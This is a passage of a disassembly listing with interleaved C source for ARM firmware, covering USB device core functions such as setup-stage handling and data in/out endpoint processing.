 800af2c:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800af2e:	2b00      	cmp	r3, #0
 800af30:	d00f      	beq.n	800af52 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800af32:	687b      	ldr	r3, [r7, #4]
 800af34:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800af38:	687b      	ldr	r3, [r7, #4]
 800af3a:	32ae      	adds	r2, #174	; 0xae
 800af3c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800af40:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800af42:	f107 020e 	add.w	r2, r7, #14
 800af46:	4610      	mov	r0, r2
 800af48:	4798      	blx	r3
 800af4a:	4602      	mov	r2, r0
 800af4c:	687b      	ldr	r3, [r7, #4]
 800af4e:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800af52:	687b      	ldr	r3, [r7, #4]
 800af54:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800af58:	1c5a      	adds	r2, r3, #1
 800af5a:	687b      	ldr	r3, [r7, #4]
 800af5c:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800af60:	2300      	movs	r3, #0
}
 800af62:	4618      	mov	r0, r3
 800af64:	3710      	adds	r7, #16
 800af66:	46bd      	mov	sp, r7
 800af68:	bd80      	pop	{r7, pc}

0800af6a <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800af6a:	b580      	push	{r7, lr}
 800af6c:	b082      	sub	sp, #8
 800af6e:	af00      	add	r7, sp, #0
 800af70:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800af72:	6878      	ldr	r0, [r7, #4]
 800af74:	f001 fdca 	bl	800cb0c <USBD_LL_Start>
 800af78:	4603      	mov	r3, r0
}
 800af7a:	4618      	mov	r0, r3
 800af7c:	3708      	adds	r7, #8
 800af7e:	46bd      	mov	sp, r7
 800af80:	bd80      	pop	{r7, pc}

0800af82 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800af82:	b480      	push	{r7}
 800af84:	b083      	sub	sp, #12
 800af86:	af00      	add	r7, sp, #0
 800af88:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af8a:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af8c:	4618      	mov	r0, r3
 800af8e:	370c      	adds	r7, #12
 800af90:	46bd      	mov	sp, r7
 800af92:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af96:	4770      	bx	lr

0800af98 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af98:	b580      	push	{r7, lr}
 800af9a:	b084      	sub	sp, #16
 800af9c:	af00      	add	r7, sp, #0
 800af9e:	6078      	str	r0, [r7, #4]
 800afa0:	460b      	mov	r3, r1
 800afa2:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800afa4:	2300      	movs	r3, #0
 800afa6:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800afa8:	687b      	ldr	r3, [r7, #4]
 800afaa:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afae:	2b00      	cmp	r3, #0
 800afb0:	d009      	beq.n	800afc6 <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800afb2:	687b      	ldr	r3, [r7, #4]
 800afb4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afb8:	681b      	ldr	r3, [r3, #0]
 800afba:	78fa      	ldrb	r2, [r7, #3]
 800afbc:	4611      	mov	r1, r2
 800afbe:	6878      	ldr	r0, [r7, #4]
 800afc0:	4798      	blx	r3
 800afc2:	4603      	mov	r3, r0
 800afc4:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800afc6:	7bfb      	ldrb	r3, [r7, #15]
}
 800afc8:	4618      	mov	r0, r3
 800afca:	3710      	adds	r7, #16
 800afcc:	46bd      	mov	sp, r7
 800afce:	bd80      	pop	{r7, pc}

0800afd0 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800afd0:	b580      	push	{r7, lr}
 800afd2:	b084      	sub	sp, #16
 800afd4:	af00      	add	r7, sp, #0
 800afd6:	6078      	str	r0, [r7, #4]
 800afd8:	460b      	mov	r3, r1
 800afda:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800afdc:	2300      	movs	r3, #0
 800afde:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800afe0:	687b      	ldr	r3, [r7, #4]
 800afe2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afe6:	685b      	ldr	r3, [r3, #4]
 800afe8:	78fa      	ldrb	r2, [r7, #3]
 800afea:	4611      	mov	r1, r2
 800afec:	6878      	ldr	r0, [r7, #4]
 800afee:	4798      	blx	r3
 800aff0:	4603      	mov	r3, r0
 800aff2:	2b00      	cmp	r3, #0
 800aff4:	d001      	beq.n	800affa <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800aff6:	2303      	movs	r3, #3
 800aff8:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800affa:	7bfb      	ldrb	r3, [r7, #15]
}
 800affc:	4618      	mov	r0, r3
 800affe:	3710      	adds	r7, #16
 800b000:	46bd      	mov	sp, r7
 800b002:	bd80      	pop	{r7, pc}

0800b004 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b004:	b580      	push	{r7, lr}
 800b006:	b084      	sub	sp, #16
 800b008:	af00      	add	r7, sp, #0
 800b00a:	6078      	str	r0, [r7, #4]
 800b00c:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b00e:	687b      	ldr	r3, [r7, #4]
 800b010:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b014:	6839      	ldr	r1, [r7, #0]
 800b016:	4618      	mov	r0, r3
 800b018:	f001 f8a7 	bl	800c16a <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b01c:	687b      	ldr	r3, [r7, #4]
 800b01e:	2201      	movs	r2, #1
 800b020:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b024:	687b      	ldr	r3, [r7, #4]
 800b026:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b02a:	461a      	mov	r2, r3
 800b02c:	687b      	ldr	r3, [r7, #4]
 800b02e:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b032:	687b      	ldr	r3, [r7, #4]
 800b034:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b038:	f003 031f 	and.w	r3, r3, #31
 800b03c:	2b02      	cmp	r3, #2
 800b03e:	d01a      	beq.n	800b076 <USBD_LL_SetupStage+0x72>
 800b040:	2b02      	cmp	r3, #2
 800b042:	d822      	bhi.n	800b08a <USBD_LL_SetupStage+0x86>
 800b044:	2b00      	cmp	r3, #0
 800b046:	d002      	beq.n	800b04e <USBD_LL_SetupStage+0x4a>
 800b048:	2b01      	cmp	r3, #1
 800b04a:	d00a      	beq.n	800b062 <USBD_LL_SetupStage+0x5e>
 800b04c:	e01d      	b.n	800b08a <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b04e:	687b      	ldr	r3, [r7, #4]
 800b050:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b054:	4619      	mov	r1, r3
 800b056:	6878      	ldr	r0, [r7, #4]
 800b058:	f000 fad4 	bl	800b604 <USBD_StdDevReq>
 800b05c:	4603      	mov	r3, r0
 800b05e:	73fb      	strb	r3, [r7, #15]
      break;
 800b060:	e020      	b.n	800b0a4 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b062:	687b      	ldr	r3, [r7, #4]
 800b064:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b068:	4619      	mov	r1, r3
 800b06a:	6878      	ldr	r0, [r7, #4]
 800b06c:	f000 fb3c 	bl	800b6e8 <USBD_StdItfReq>
 800b070:	4603      	mov	r3, r0
 800b072:	73fb      	strb	r3, [r7, #15]
      break;
 800b074:	e016      	b.n	800b0a4 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b076:	687b      	ldr	r3, [r7, #4]
 800b078:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b07c:	4619      	mov	r1, r3
 800b07e:	6878      	ldr	r0, [r7, #4]
 800b080:	f000 fb9e 	bl	800b7c0 <USBD_StdEPReq>
 800b084:	4603      	mov	r3, r0
 800b086:	73fb      	strb	r3, [r7, #15]
      break;
 800b088:	e00c      	b.n	800b0a4 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b08a:	687b      	ldr	r3, [r7, #4]
 800b08c:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b090:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b094:	b2db      	uxtb	r3, r3
 800b096:	4619      	mov	r1, r3
 800b098:	6878      	ldr	r0, [r7, #4]
 800b09a:	f001 fe13 	bl	800ccc4 <USBD_LL_StallEP>
 800b09e:	4603      	mov	r3, r0
 800b0a0:	73fb      	strb	r3, [r7, #15]
      break;
 800b0a2:	bf00      	nop
  }

  return ret;
 800b0a4:	7bfb      	ldrb	r3, [r7, #15]
}
 800b0a6:	4618      	mov	r0, r3
 800b0a8:	3710      	adds	r7, #16
 800b0aa:	46bd      	mov	sp, r7
 800b0ac:	bd80      	pop	{r7, pc}

0800b0ae <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b0ae:	b580      	push	{r7, lr}
 800b0b0:	b086      	sub	sp, #24
 800b0b2:	af00      	add	r7, sp, #0
 800b0b4:	60f8      	str	r0, [r7, #12]
 800b0b6:	460b      	mov	r3, r1
 800b0b8:	607a      	str	r2, [r7, #4]
 800b0ba:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b0bc:	2300      	movs	r3, #0
 800b0be:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b0c0:	7afb      	ldrb	r3, [r7, #11]
 800b0c2:	2b00      	cmp	r3, #0
 800b0c4:	d16e      	bne.n	800b1a4 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b0c6:	68fb      	ldr	r3, [r7, #12]
 800b0c8:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b0cc:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b0ce:	68fb      	ldr	r3, [r7, #12]
 800b0d0:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b0d4:	2b03      	cmp	r3, #3
 800b0d6:	f040 8098 	bne.w	800b20a <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b0da:	693b      	ldr	r3, [r7, #16]
 800b0dc:	689a      	ldr	r2, [r3, #8]
 800b0de:	693b      	ldr	r3, [r7, #16]
 800b0e0:	68db      	ldr	r3, [r3, #12]
 800b0e2:	429a      	cmp	r2, r3
 800b0e4:	d913      	bls.n	800b10e <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b0e6:	693b      	ldr	r3, [r7, #16]
 800b0e8:	689a      	ldr	r2, [r3, #8]
 800b0ea:	693b      	ldr	r3, [r7, #16]
 800b0ec:	68db      	ldr	r3, [r3, #12]
 800b0ee:	1ad2      	subs	r2, r2, r3
 800b0f0:	693b      	ldr	r3, [r7, #16]
 800b0f2:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b0f4:	693b      	ldr	r3, [r7, #16]
 800b0f6:	68da      	ldr	r2, [r3, #12]
 800b0f8:	693b      	ldr	r3, [r7, #16]
 800b0fa:	689b      	ldr	r3, [r3, #8]
 800b0fc:	4293      	cmp	r3, r2
 800b0fe:	bf28      	it	cs
 800b100:	4613      	movcs	r3, r2
 800b102:	461a      	mov	r2, r3
 800b104:	6879      	ldr	r1, [r7, #4]
 800b106:	68f8      	ldr	r0, [r7, #12]
 800b108:	f001 f923 	bl	800c352 <USBD_CtlContinueRx>
 800b10c:	e07d      	b.n	800b20a <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b10e:	68fb      	ldr	r3, [r7, #12]
 800b110:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b114:	f003 031f 	and.w	r3, r3, #31
 800b118:	2b02      	cmp	r3, #2
 800b11a:	d014      	beq.n	800b146 <USBD_LL_DataOutStage+0x98>
 800b11c:	2b02      	cmp	r3, #2
 800b11e:	d81d      	bhi.n	800b15c <USBD_LL_DataOutStage+0xae>
 800b120:	2b00      	cmp	r3, #0
 800b122:	d002      	beq.n	800b12a <USBD_LL_DataOutStage+0x7c>
 800b124:	2b01      	cmp	r3, #1
 800b126:	d003      	beq.n	800b130 <USBD_LL_DataOutStage+0x82>
 800b128:	e018      	b.n	800b15c <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b12a:	2300      	movs	r3, #0
 800b12c:	75bb      	strb	r3, [r7, #22]
            break;
 800b12e:	e018      	b.n	800b162 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b130:	68fb      	ldr	r3, [r7, #12]
 800b132:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b136:	b2db      	uxtb	r3, r3
 800b138:	4619      	mov	r1, r3
 800b13a:	68f8      	ldr	r0, [r7, #12]
 800b13c:	f000 f9d2 	bl	800b4e4 <USBD_CoreFindIF>
 800b140:	4603      	mov	r3, r0
 800b142:	75bb      	strb	r3, [r7, #22]
            break;
 800b144:	e00d      	b.n	800b162 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b146:	68fb      	ldr	r3, [r7, #12]
 800b148:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b14c:	b2db      	uxtb	r3, r3
 800b14e:	4619      	mov	r1, r3
 800b150:	68f8      	ldr	r0, [r7, #12]
 800b152:	f000 f9d4 	bl	800b4fe <USBD_CoreFindEP>
 800b156:	4603      	mov	r3, r0
 800b158:	75bb      	strb	r3, [r7, #22]
            break;
 800b15a:	e002      	b.n	800b162 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b15c:	2300      	movs	r3, #0
 800b15e:	75bb      	strb	r3, [r7, #22]
            break;
 800b160:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b162:	7dbb      	ldrb	r3, [r7, #22]
 800b164:	2b00      	cmp	r3, #0
 800b166:	d119      	bne.n	800b19c <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b168:	68fb      	ldr	r3, [r7, #12]
 800b16a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b16e:	b2db      	uxtb	r3, r3
 800b170:	2b03      	cmp	r3, #3
 800b172:	d113      	bne.n	800b19c <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b174:	7dba      	ldrb	r2, [r7, #22]
 800b176:	68fb      	ldr	r3, [r7, #12]
 800b178:	32ae      	adds	r2, #174	; 0xae
 800b17a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b17e:	691b      	ldr	r3, [r3, #16]
 800b180:	2b00      	cmp	r3, #0
 800b182:	d00b      	beq.n	800b19c <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b184:	7dba      	ldrb	r2, [r7, #22]
 800b186:	68fb      	ldr	r3, [r7, #12]
 800b188:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b18c:	7dba      	ldrb	r2, [r7, #22]
 800b18e:	68fb      	ldr	r3, [r7, #12]
 800b190:	32ae      	adds	r2, #174	; 0xae
 800b192:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b196:	691b      	ldr	r3, [r3, #16]
 800b198:	68f8      	ldr	r0, [r7, #12]
 800b19a:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b19c:	68f8      	ldr	r0, [r7, #12]
 800b19e:	f001 f8e9 	bl	800c374 <USBD_CtlSendStatus>
 800b1a2:	e032      	b.n	800b20a <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b1a4:	7afb      	ldrb	r3, [r7, #11]
 800b1a6:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b1aa:	b2db      	uxtb	r3, r3
 800b1ac:	4619      	mov	r1, r3
 800b1ae:	68f8      	ldr	r0, [r7, #12]
 800b1b0:	f000 f9a5 	bl	800b4fe <USBD_CoreFindEP>
 800b1b4:	4603      	mov	r3, r0
 800b1b6:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b1b8:	7dbb      	ldrb	r3, [r7, #22]
 800b1ba:	2bff      	cmp	r3, #255	; 0xff
 800b1bc:	d025      	beq.n	800b20a <USBD_LL_DataOutStage+0x15c>
 800b1be:	7dbb      	ldrb	r3, [r7, #22]
 800b1c0:	2b00      	cmp	r3, #0
 800b1c2:	d122      	bne.n	800b20a <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b1c4:	68fb      	ldr	r3, [r7, #12]
 800b1c6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b1ca:	b2db      	uxtb	r3, r3
 800b1cc:	2b03      	cmp	r3, #3
 800b1ce:	d117      	bne.n	800b200 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b1d0:	7dba      	ldrb	r2, [r7, #22]
 800b1d2:	68fb      	ldr	r3, [r7, #12]
 800b1d4:	32ae      	adds	r2, #174	; 0xae
 800b1d6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b1da:	699b      	ldr	r3, [r3, #24]
 800b1dc:	2b00      	cmp	r3, #0
 800b1de:	d00f      	beq.n	800b200 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b1e0:	7dba      	ldrb	r2, [r7, #22]
 800b1e2:	68fb      	ldr	r3, [r7, #12]
 800b1e4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b1e8:	7dba      	ldrb	r2, [r7, #22]
 800b1ea:	68fb      	ldr	r3, [r7, #12]
 800b1ec:	32ae      	adds	r2, #174	; 0xae
 800b1ee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b1f2:	699b      	ldr	r3, [r3, #24]
 800b1f4:	7afa      	ldrb	r2, [r7, #11]
 800b1f6:	4611      	mov	r1, r2
 800b1f8:	68f8      	ldr	r0, [r7, #12]
 800b1fa:	4798      	blx	r3
 800b1fc:	4603      	mov	r3, r0
 800b1fe:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b200:	7dfb      	ldrb	r3, [r7, #23]
 800b202:	2b00      	cmp	r3, #0
 800b204:	d001      	beq.n	800b20a <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b206:	7dfb      	ldrb	r3, [r7, #23]
 800b208:	e000      	b.n	800b20c <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b20a:	2300      	movs	r3, #0
}
 800b20c:	4618      	mov	r0, r3
 800b20e:	3718      	adds	r7, #24
 800b210:	46bd      	mov	sp, r7
 800b212:	bd80      	pop	{r7, pc}

0800b214 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b214:	b580      	push	{r7, lr}
 800b216:	b086      	sub	sp, #24
 800b218:	af00      	add	r7, sp, #0
 800b21a:	60f8      	str	r0, [r7, #12]
 800b21c:	460b      	mov	r3, r1
 800b21e:	607a      	str	r2, [r7, #4]
 800b220:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b222:	7afb      	ldrb	r3, [r7, #11]
 800b224:	2b00      	cmp	r3, #0
 800b226:	d16f      	bne.n	800b308 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b228:	68fb      	ldr	r3, [r7, #12]
 800b22a:	3314      	adds	r3, #20
 800b22c:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b22e:	68fb      	ldr	r3, [r7, #12]
 800b230:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b234:	2b02      	cmp	r3, #2
 800b236:	d15a      	bne.n	800b2ee <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b238:	693b      	ldr	r3, [r7, #16]
 800b23a:	689a      	ldr	r2, [r3, #8]
 800b23c:	693b      	ldr	r3, [r7, #16]
 800b23e:	68db      	ldr	r3, [r3, #12]
 800b240:	429a      	cmp	r2, r3
 800b242:	d914      	bls.n	800b26e <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b244:	693b      	ldr	r3, [r7, #16]
 800b246:	689a      	ldr	r2, [r3, #8]
 800b248:	693b      	ldr	r3, [r7, #16]
 800b24a:	68db      	ldr	r3, [r3, #12]
 800b24c:	1ad2      	subs	r2, r2, r3
 800b24e:	693b      	ldr	r3, [r7, #16]
 800b250:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b252:	693b      	ldr	r3, [r7, #16]
 800b254:	689b      	ldr	r3, [r3, #8]
 800b256:	461a      	mov	r2, r3
 800b258:	6879      	ldr	r1, [r7, #4]
 800b25a:	68f8      	ldr	r0, [r7, #12]
 800b25c:	f001 f84b 	bl	800c2f6 <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b260:	2300      	movs	r3, #0
 800b262:	2200      	movs	r2, #0
 800b264:	2100      	movs	r1, #0
 800b266:	68f8      	ldr	r0, [r7, #12]
 800b268:	f001 fe34 	bl	800ced4 <USBD_LL_PrepareReceive>
 800b26c:	e03f      	b.n	800b2ee <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b26e:	693b      	ldr	r3, [r7, #16]
 800b270:	68da      	ldr	r2, [r3, #12]
 800b272:	693b      	ldr	r3, [r7, #16]
 800b274:	689b      	ldr	r3, [r3, #8]
 800b276:	429a      	cmp	r2, r3
 800b278:	d11c      	bne.n	800b2b4 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b27a:	693b      	ldr	r3, [r7, #16]
 800b27c:	685a      	ldr	r2, [r3, #4]
 800b27e:	693b      	ldr	r3, [r7, #16]
 800b280:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b282:	429a      	cmp	r2, r3
 800b284:	d316      	bcc.n	800b2b4 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b286:	693b      	ldr	r3, [r7, #16]
 800b288:	685a      	ldr	r2, [r3, #4]
 800b28a:	68fb      	ldr	r3, [r7, #12]
 800b28c:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b290:	429a      	cmp	r2, r3
 800b292:	d20f      	bcs.n	800b2b4 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b294:	2200      	movs	r2, #0
 800b296:	2100      	movs	r1, #0
 800b298:	68f8      	ldr	r0, [r7, #12]
 800b29a:	f001 f82c 	bl	800c2f6 <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b29e:	68fb      	ldr	r3, [r7, #12]
 800b2a0:	2200      	movs	r2, #0
 800b2a2:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b2a6:	2300      	movs	r3, #0
 800b2a8:	2200      	movs	r2, #0
 800b2aa:	2100      	movs	r1, #0
 800b2ac:	68f8      	ldr	r0, [r7, #12]
 800b2ae:	f001 fe11 	bl	800ced4 <USBD_LL_PrepareReceive>
 800b2b2:	e01c      	b.n	800b2ee <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2b4:	68fb      	ldr	r3, [r7, #12]
 800b2b6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2ba:	b2db      	uxtb	r3, r3
 800b2bc:	2b03      	cmp	r3, #3
 800b2be:	d10f      	bne.n	800b2e0 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b2c0:	68fb      	ldr	r3, [r7, #12]
 800b2c2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2c6:	68db      	ldr	r3, [r3, #12]
 800b2c8:	2b00      	cmp	r3, #0
 800b2ca:	d009      	beq.n	800b2e0 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b2cc:	68fb      	ldr	r3, [r7, #12]
 800b2ce:	2200      	movs	r2, #0
 800b2d0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b2d4:	68fb      	ldr	r3, [r7, #12]
 800b2d6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2da:	68db      	ldr	r3, [r3, #12]
 800b2dc:	68f8      	ldr	r0, [r7, #12]
 800b2de:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b2e0:	2180      	movs	r1, #128	; 0x80
 800b2e2:	68f8      	ldr	r0, [r7, #12]
 800b2e4:	f001 fcee 	bl	800ccc4 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b2e8:	68f8      	ldr	r0, [r7, #12]
 800b2ea:	f001 f856 	bl	800c39a <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b2ee:	68fb      	ldr	r3, [r7, #12]
 800b2f0:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b2f4:	2b00      	cmp	r3, #0
 800b2f6:	d03a      	beq.n	800b36e <USBD_LL_DataInStage+0x15a>
    {
